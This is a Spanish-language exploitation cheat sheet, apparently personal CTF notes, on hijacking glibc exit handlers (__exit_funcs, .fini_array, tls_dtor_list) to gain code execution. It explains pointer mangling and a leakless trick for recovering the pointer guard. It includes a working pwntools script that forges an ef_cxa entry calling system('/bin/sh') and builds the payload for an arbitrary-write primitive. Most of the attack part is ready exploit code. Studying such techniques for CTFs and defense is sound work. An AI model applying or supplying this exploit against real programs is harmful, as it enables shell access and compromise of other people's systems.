# Exit handlers y estructuras de terminacion (cheat sheet)

Rutas de RCE que se disparan cuando el programa TERMINA (return de main, exit(), o al recibir
una senal). Muy usadas cuando no hay hooks (glibc >= 2.34) pero SI hay escritura arbitraria.

## __run_exit_handlers / __exit_funcs
`exit()` llama a `__run_exit_handlers`, que recorre la lista `__exit_funcs` (registrada por
atexit/on_exit y con `_dl_fini` por defecto). Cada entrada tiene un puntero a funcion.
- Requisito: el programa debe salir por return de main o exit() (no _exit/abort directos).
- Si controlas la lista (arb write sobre __exit_funcs o sobre una entry) puedes registrar tu
  funcion (p.ej. system) con su argumento.

## Pointer mangling / pointer guard
Los punteros de exit handlers estan CIFRADOS: `enc = rol(ptr ^ guard, 0x11)` (rotate-left 17;
al descifrar, ror 0x11 y xor guard). El `guard` esta en el TLS (`fs:0x30`).
- Para forjar una entry valida necesitas el pointer_guard.
- Truco leakless: `_dl_fini` YA esta registrado y su valor cifrado esta ahi; si conoces
  `_dl_fini` (misma libc/ld) puedes recuperar el guard:
  `guard = ror(enc_dl_fini, 0x11) ^ _dl_fini`  y con el cifrar tu propio puntero.

## .fini_array / _dl_fini
`_dl_fini` ejecuta el array `.fini_array` de cada objeto cargado. Con escritura sobre una
entrada de `.fini_array` (No/Partial RELRO -> a veces escribible) o forjando una tabla
fini_array falsa que _dl_fini recorra, consigues ejecucion al salir.

## atexit / __cxa_atexit
Destructores de C++ registrados con __cxa_atexit se guardan en la misma estructura de exit
funcs (con dso_handle). Mismo mangling; misma ruta de explotacion.

## TLS / structs relacionadas
- tls_dtor_list: destructores de variables thread_local; punteros mangled con el mismo guard.
- __call_tls_dtors los ejecuta al salir del hilo.

## Layout de las structs (x86-64 glibc)
```c
struct exit_function {                 // 24 bytes
  long int flavor;                     // 0=ef_free, 3=ef_on, 4=ef_cxa
  union {
    void (*at)(void);                  // ef_on:  func.at()
    struct { void (*fn)(void*,int); void *arg; void *dso; } c;  // ef_cxa: fn(arg,status)
  } func;
};
struct exit_function_list {
  struct exit_function_list *next;
  size_t idx;                          // nº de entries usadas
  struct exit_function fns[32];
};
// __exit_funcs -> initial (lista estatica en libc, .bss/.data)
```
Ruta mas comoda: `ef_cxa` (flavor 4), porque `fn` recibe `arg` -> forja `fn=system`, `arg="/bin/sh"`.

## Ejemplo pwntools: forjar entry ef_cxa (leakless guard)
```python
from pwn import *
def rol(v,r,b=64): r%=b; return ((v<<r)|(v>>(b-r))) & (2**b-1)
def ror(v,r,b=64): r%=b; return ((v>>r)|(v<<(b-r))) & (2**b-1)
def mangle(ptr,guard):  return rol(ptr ^ guard, 0x11)   # PTR_MANGLE glibc x86-64
def demangle(enc,guard): return ror(enc, 0x11) ^ guard

libc = ELF("./libc.so.6")

# --- Opcion A: recuperar el guard sin leer el TLS ---
# La lista inicial YA trae un puntero cifrado conocido (_dl_fini / __libc_csu_fini).
# Si lees ese valor cifrado y conoces la direccion real (misma libc), despejas el guard:
guard = ror(enc_dl_fini, 0x11) ^ dl_fini_addr    # enc_dl_fini leido de __exit_funcs->fns[0]

# --- Opcion B: si tienes leak del TLS, el guard esta en fs:0x30 (pointer_guard) ---
# guard = leak_tls_0x30

# Forjar UNA entry ef_cxa que ejecute system("/bin/sh") al salir por main/exit():
entry  = p64(4)                                  # flavor = ef_cxa
entry += p64(mangle(libc.sym.system, guard))     # func.c.fn  (cifrado)
entry += p64(next(libc.search(b"/bin/sh")))      # func.c.arg -> pasa como 1er arg a system

# Escribe con tu arb-write: idx>=1 y fns[0]=entry (o pisa una entry existente y ajusta idx).
payload  = p64(0)          # next = NULL
payload += p64(1)          # idx = 1  (una entry valida)
payload += entry           # fns[0]
# write_arb(exit_funcs_addr, payload)  ; luego dispara return de main / exit()
```
Notas: `system` deja `status` en el 2º arg (ignorado). Si solo puedes pisar `fns[0].func` sin
tocar `flavor`, comprueba que ya sea 4; si es 3 (ef_on) llama `at()` sin args -> apunta a un
one_gadget en vez de system.

## Cuando usarlo
Tienes arb write pero Full RELRO (no GOT) y glibc sin hooks. Objetivos: __exit_funcs,
.fini_array, tls_dtor_list. Combina con un leak de libc/ld o con la tecnica leakless del guard.
Relacionado: FSOP ([[modern-heap]]) es la otra gran ruta "al salir/al hacer IO".
